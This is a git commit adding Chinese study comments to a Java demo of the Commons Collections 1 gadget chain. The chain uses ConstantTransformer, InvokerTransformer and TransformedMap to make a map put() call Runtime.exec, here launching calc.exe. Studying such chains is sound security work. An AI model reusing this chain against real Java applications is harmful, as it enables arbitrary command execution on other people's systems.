2b0ea211197164fbc2214b853c3ebe07b2e611b5
wangsz05 <wangsz05@126.com>
2022-04-11 20:30:52 +0800

    first:CC1 demo update

--- src/CC1/CommonCollections1.java
+++ src/CC1/CommonCollections1.java
@@ -10,14 +10,26 @@ import java.util.Map;
 
 public class CommonCollections1 {
     public static void main(String[] args) throws Exception {
+        //声明一个Transformer 数组。
+        //ConstantTransformer 返回Runtime.getRuntime()实例
+        //InvokerTransformer 声明三个参数，供后续Transformer调用
+        // this.iMethodName = methodName;
+        //        this.iParamTypes = paramTypes;
+        //        this.iArgs = args;
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.getRuntime()),
                 new InvokerTransformer("exec", new Class[]{String.class},
                         new Object[]{"cmd.exe /c calc.exe"}),
         };
+        //返回Transformer数组对象
         Transformer transformerChain = new ChainedTransformer(transformers);
         Map innerMap = new HashMap();
+        //生成 如下两个对象：
+        // this.keyTransformer = keyTransformer;
+        //        this.valueTransformer = valueTransformer;
         Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        //在setvalue中逐个转换上述的对象，触发漏洞，通过在transformKey 或者 transformValue 中进行个转化
+        //最终在InvokerTransformer.tansform 中调用漏洞
         outerMap.put("test", "xxxx");
     }
 }
